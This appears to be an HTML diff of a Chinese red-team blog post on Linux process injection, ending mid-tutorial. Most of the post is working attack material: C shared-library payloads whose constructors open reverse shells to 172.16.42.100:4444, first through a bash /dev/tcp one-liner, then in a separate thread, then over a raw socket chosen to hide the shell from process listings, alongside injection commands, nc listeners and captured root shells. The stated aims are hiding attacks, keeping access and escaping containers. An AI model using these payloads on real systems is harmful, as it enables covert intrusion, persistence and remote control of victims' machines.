@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="持而盈之，不如其已。揣而锐之，不可长保。  通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux进程注入">
+<meta property="og:url" content="http://example.com/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="持而盈之，不如其已。揣而锐之，不可长保。  通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-29T11:54:03.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:31:31.573Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="Linux安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux进程注入 | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux进程注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-29 19:54:03" itemprop="dateCreated datePublished" datetime="2021-12-29T19:54:03+08:00">2021-12-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:31:31" itemprop="dateModified" datetime="2022-06-10T20:31:31+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>持而盈之，不如其已。揣而锐之，不可长保。</p>
+</blockquote>
+<p>通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。</p>
+<span id="more"></span>
+
+<h2 id="1-使用动态链接库进行进程注入"><a href="#1-使用动态链接库进行进程注入" class="headerlink" title="1. 使用动态链接库进行进程注入"></a>1. 使用动态链接库进行进程注入</h2><h3 id="1-1-动态链接注入"><a href="#1-1-动态链接注入" class="headerlink" title="1.1 动态链接注入"></a>1.1 动态链接注入</h3><p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<code>CreateRemoteThread()</code>。</p>
+<p>linux的/proc/sys/kernel/yama/ptrace_scope限制了一个进程除了<code>fork()</code>派生外，无法通过<code>ptrace()</code>来操作另外一个进程。我们可以通过<code>echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</code>来修改，但是一般linux版本默认就是为0。</p>
+<p>使用别已经造好的进程注入轮子：<a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
+<h3 id="1-2-进程注入工具安装"><a href="#1-2-进程注入工具安装" class="headerlink" title="1.2 进程注入工具安装"></a>1.2 进程注入工具安装</h3><p><strong>1. 下载：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/gaffe23/</span>linux-inject.git</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 编译：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cd</span> linux-inject</span><br><span class="line"><span class="attribute">make</span> x<span class="number">86</span>_<span class="number">64</span></span><br></pre></td></tr></table></figure>
+
+<p>如果报错类似如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/include/stdio.h:27:10: fatal error: <span class="string">&#x27;bits/libc-header-start.h&#x27;</span> file not found</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>apt install gcc-multilib</code>即可。</p>
+<p><strong>3. 测试是否编译成功：</strong></p>
+<ul>
+<li><p>启动sample-target</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br></pre></td></tr></table></figure></li>
+<li><p>查看sample-target的进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  linux-inject git:(master) ps -ef | grep sample-target | grep -v grep</span><br><span class="line">root      15771  15710  0 20:12 pts/3    00:00:00 ./sample-targe</span><br></pre></td></tr></table></figure>
+
+<p>进程为15771</p>
+</li>
+<li><p>尝试注入进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./inject -p 15771 ./sample-library.so</span><br><span class="line">targeting process with pid 15771</span><br><span class="line">could not inject <span class="string">&quot;./sample-library.so&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>进程注入成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">......</span><br><span class="line">I just got loaded</span><br></pre></td></tr></table></figure>
+
+<p>注入成功会有”I just got loaded“的提示</p>
+</li>
+</ul>
+<h3 id="1-3-编写一个简单的poc"><a href="#1-3-编写一个简单的poc" class="headerlink" title="1.3 编写一个简单的poc"></a>1.3 编写一个简单的poc</h3><p>我们重写so文件，进行反弹shell。</p>
+<p>poc1.c:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们用clang进行编译，编译前先安装<code>apt install clang</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc1.so -lpthread -fPIC poc1.c</span><br></pre></td></tr></table></figure>
+
+<p>我们启动一个python进程用来注入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p>在攻击机上启动监听：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜ ps -ef | grep 9999 | grep -v grep</span><br><span class="line">root      16603  15710  0 20:38 pts/3    00:00:00 python3 -m http.server 9999</span><br><span class="line">➜ ./linux-inject/inject -p 16603 ./poc1.so</span><br><span class="line">targeting process with pid 16603</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37444.</span><br><span class="line">root@vuln:~/poc/linux-inject<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-4-测试开启ptrace-scope"><a href="#1-4-测试开启ptrace-scope" class="headerlink" title="1.4 测试开启ptrace_scope"></a>1.4 测试开启ptrace_scope</h3><p>我用的debian,linux内核 4.19，测试是成功的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ <span class="built_in">echo</span> 1 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ cat /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">➜ ps -ef | grep 6666 | grep -v grep</span><br><span class="line">root        854    649  1 10:32 pts/1    00:00:00 python3 -m http.server 6666</span><br><span class="line"></span><br><span class="line">➜ ./linux-inject/inject -p 854 ./poc1.so</span><br><span class="line">targeting process with pid 854</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br><span class="line"></span><br><span class="line">➜ uname -a</span><br><span class="line">Linux vuln 4.19.0-18-amd64 <span class="comment">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-5-使用多线程编写poc"><a href="#1-5-使用多线程编写poc" class="headerlink" title="1.5 使用多线程编写poc"></a>1.5 使用多线程编写poc</h3><p>修改poc为多线程版本，将后门代码与正常逻辑分离执行，这样就不会影响正常的线程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">   pthread_create(&amp;thread_id,<span class="literal">NULL</span>,shell,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>编译：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc2.so -lpthread -fPIC poc2.c</span><br><span class="line">poc2.c:17:4: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;pthread_create&#x27;</span> is invalid <span class="keyword">in</span> C99 [-Wimplicit-function-declaration]</span><br></pre></td></tr></table></figure>
+
+<p><strong>启动一个被注入的python进程：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1111</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击机监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>进程注入：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜ ps -ef | grep 1111 | grep -v grep</span><br><span class="line">root       1333   1299  0 11:53 pts/1    00:00:00 python3 -m http.server 1111</span><br><span class="line">➜ ./linux-inject/inject -p 1333 ./poc2.so</span><br><span class="line">targeting process with pid 1333</span><br><span class="line">could not inject <span class="string">&quot;./poc2.so</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>收到了shell：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39404.</span><br><span class="line">root@vuln:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-6-使用socket套接字编写poc"><a href="#1-6-使用socket套接字编写poc" class="headerlink" title="1.6 使用socket套接字编写poc"></a>1.6 使用socket套接字编写poc</h3><p>这种方式的好处是可以隐藏我们的行为，上述方式都可以通过查看进程的方式发现恶意注入的代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜ ps -ef | grep bash</span><br><span class="line">root       1447   1406  0 12:00 pts/1    00:00:00 sh -c bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">root       1448   1447  0 12:00 pts/1    00:00:00 bash -c bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1</span><br><span class="line">root       1449   1448  0 12:00 pts/1    00:00:00 bash -i</span><br><span class="line">root       1487    978  0 12:00 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现我们已经暴露了我们反弹的shell地址。</p>
+<p>解决方式就是自己写一个socket连接，而不是调用system函数</p>
+<p>poc.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="keyword">int</span> sock;</span><br><span class="line">    <span class="keyword">char</span> shell[]=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;172.16.42.100&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;server, <span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    execl(shell,<span class="string">&quot;/bin/bash&quot;</span>,(<span class="keyword">char</span> *)<span class="number">0</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread_id;</span><br><span class="line">    pthread_create(&amp;thread_id,<span class="literal">NULL</span>,hello,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>编译：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc.so -lpthread -fPIC poc.c</span><br></pre></td></tr></table></figure>
+
+<p><strong>启一个python进程作为注入目标：</strong></p>
